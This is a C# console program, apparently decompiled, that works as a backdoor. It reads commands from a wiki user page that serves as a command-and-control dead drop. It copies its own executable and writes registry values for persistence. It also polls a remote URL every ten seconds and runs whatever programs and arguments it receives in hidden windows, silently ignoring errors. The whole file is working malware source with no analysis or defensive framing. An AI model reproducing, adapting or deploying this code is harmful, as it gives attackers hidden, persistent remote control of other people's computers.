using System;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Reflection;
using System.Text;
using System.Threading;
using System.Timers;
using Microsoft.Win32;

namespace ConsoleApplication1;

internal class Program
{
	public static string lastran;

	private static string ReadTextFromUrl(string url)
	{
		using WebClient webClient = new WebClient();
		using Stream stream = webClient.OpenRead(url);
		using StreamReader streamReader = new StreamReader(stream, Encoding.UTF8, detectEncodingFromByteOrderMarks: true);
		return streamReader.ReadToEnd();
	}

	private static void Main(string[] args)
	{
		ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
		string text = "https://computernewb.com/wiki/User:LGHUJgdhnjfhgdWR3Z6HN/MNVCBNRETJUWEI3333333";
		string[] array = RetrieveCommand(ReadTextFromUrl(text));
		foreach (string text2 in array)
		{
			RegistryKey registryKey = null;
			string text3 = text2.Replace("{APPDATA}", Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData));
			string[] array2 = text3.Split(new char[1] { '|' });
			switch (array2[0])
			{
			case "GETDATA":
				GetData(text + "\\" + array2[1]);
				break;
			case "APPINIT":
			{
				string text4 = array2[4];
				if (!File.Exists(text4))
				{
					File.Copy(Assembly.GetExecutingAssembly().Location, text4);
					switch (array2[1])
					{
					case "HKEY_CURRENT_USER":
						registryKey = Registry.CurrentUser.OpenSubKey(array2[2], writable: true);
						break;
					case "HKEY_LOCAL_MACHINE":
						registryKey = Registry.LocalMachine.OpenSubKey(array2[2], writable: true);
						break;
					}
					registryKey.SetValue(array2[3], text4);
				}
				break;
			}
			}
		}
		new ManualResetEventSlim().Wait();
	}

	private static void GetData(string s)
	{
		try
		{
			System.Timers.Timer timer = new System.Timers.Timer();
			timer.Elapsed += delegate
			{
				string[] array = RetrieveCommand(ReadTextFromUrl(s));
				string[] array2 = array;
				foreach (string text in array2)
				{
					if (lastran != text)
					{
						string[] array3 = text.Split(new char[1] { '|' });
						ProcessStartInfo startInfo = new ProcessStartInfo
						{
							FileName = array3[0],
							Arguments = array3[1],
							WindowStyle = ProcessWindowStyle.Hidden,
							CreateNoWindow = true
						};
						Process process = new Process();
						process.StartInfo = startInfo;
						process.Start();
						lastran = text;
					}
				}
			};
			timer.Interval = 10000.0;
			timer.Enabled = true;
			timer.Start();
		}
		catch
		{
		}
	}

	private static string[] RetrieveCommand(string p)
	{
		string text = WebUtility.HtmlDecode(p);
		string[] array = text.Split(new string[1] { "\n" }, StringSplitOptions.None);
		int num = Array.FindIndex(array, (string x) => x == "<<<<");
		int num2 = Array.FindIndex(array, (string x) => x == ">>>>");
		return array.Skip(num + 1).Take(num2 - num - 1).ToArray();
	}
}
